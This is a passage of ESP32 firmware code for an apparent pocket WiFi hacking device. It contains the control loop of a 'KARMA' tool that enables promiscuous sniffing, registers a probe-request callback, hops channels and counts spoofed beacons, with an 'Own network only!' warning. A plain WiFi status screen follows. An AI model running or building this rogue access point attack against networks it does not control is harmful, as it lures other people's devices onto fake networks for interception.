  tft.drawCentreString("Responds to ALL", SCR_CX, SCALE_Y(35), 1);
  tft.drawCentreString("probe requests!", SCR_CX, SCALE_Y(50), 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawCentreString("Own network only!", SCR_CX, SCALE_Y(70), 1);
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawCentreString("SEL:Start <:Cancel", SCR_CX, SCR_H - SCALE_Y(12), 1);

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { delay(200); return; }
    delay(20);
  }

  dhKarmaCount = 0; dhKarmaSSIDs = 0;
  for (int i = 0; i < 6; i++) dhKarmaMac[i] = (uint8_t)random(0, 256);
  dhKarmaMac[0] &= 0xFE;

  dhNetPaused = true;
  WiFi.mode(WIFI_AP);
  WiFi.softAP("dh_karma_temp", "12345678"); // Dummy AP to bring up interface
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&dhKarmaProbeCallback);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  static const int hopChs[] = {1, 6, 11};
  int hopIdx = 0;
  unsigned long lastDraw = 0, lastHop = 0;
  unsigned long holdStart = 0; bool holding = false;

  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  tft.setTextColor(CLR_SECONDARY);
  tft.drawCentreString("KARMA ACTIVE", SCR_CX, SCALE_Y(4), 1);

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if (millis() - lastHop > 1500) {
      hopIdx = (hopIdx + 1) % 3;
      esp_wifi_set_channel(hopChs[hopIdx], WIFI_SECOND_CHAN_NONE);
      lastHop = millis();
    }

    if (millis() - lastDraw > 400) {
      tft.fillRect(SCALE_X(4), SCALE_Y(20), SCR_W - SCALE_X(8), SCALE_Y(70), CLR_BG);
      char buf[32];
      sprintf(buf, "Beacons: %lu", dhKarmaCount);
      tft.setTextColor(CLR_SUCCESS); tft.drawString(buf, SCALE_X(4), SCALE_Y(25), 1);
      sprintf(buf, "SSIDs: %d", dhKarmaSSIDs);
      tft.setTextColor(CLR_PRIMARY); tft.drawString(buf, SCALE_X(4), SCALE_Y(40), 1);
      sprintf(buf, "CH: %d", hopChs[hopIdx]);
      tft.setTextColor(CLR_WARNING); tft.drawString(buf, SCALE_X(4), SCALE_Y(55), 1);

      int barW = random(20, SCR_W - SCALE_X(8));
      tft.fillRect(SCALE_X(4), SCALE_Y(75), SCR_W - SCALE_X(8), SCALE_Y(4), CLR_SURFACE);
      tft.fillRect(SCALE_X(4), SCALE_Y(75), barW, SCALE_Y(4), CLR_SECONDARY);

      tft.setTextColor(CLR_TEXT_LO);
      tft.drawString("HOLD SEL: stop", SCALE_X(4), SCR_H - SCALE_Y(12), 1);
      lastDraw = millis();
    }

    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else { holding = false; }

    yield(); delay(5);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  dhNetPaused = false;
  delay(100);
}

// ═══════════════════════════════════════════════════════════
// TOOL: WiFi Config — connect to AP using button-based entry
// ═══════════════════════════════════════════════════════════

static void dhRunWifiConfig() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("WIFI CONFIG", SCALE_X(4), SCALE_Y(2), 1);

  int y = SCALE_Y(22);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString("Current SSID:", SCALE_X(4), y, 1); y += SCALE_Y(12);
  tft.setTextColor(CLR_SUCCESS);
  tft.drawString(WIFI_SSID, SCALE_X(4), y, 1); y += SCALE_Y(16);

  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString("Status:", SCALE_X(4), y, 1); y += SCALE_Y(12);
  tft.setTextColor(wifiConnected ? CLR_SUCCESS : CLR_SECONDARY);
  tft.drawString(wifiConnected ? "Connected" : "Disconnected", SCALE_X(4), y, 1); y += SCALE_Y(16);

  if (wifiConnected) {
    tft.setTextColor(CLR_TEXT_MED);
    tft.drawString("IP:", SCALE_X(4), y, 1); y += SCALE_Y(12);
    tft.setTextColor(CLR_PRIMARY);
    tft.drawString(WiFi.localIP().toString().c_str(), SCALE_X(4), y, 1); y += SCALE_Y(12);
    char rssi[16]; sprintf(rssi, "RSSI: %ddBm", WiFi.RSSI());
    tft.setTextColor(dhRssiColor(WiFi.RSSI()));
    tft.drawString(rssi, SCALE_X(4), y, 1);
  }

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL: back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);

  dhWaitSelectPress();
  delay(200);
}

#endif // ESP32
#endif // DH_WIFI_TOOLS_H
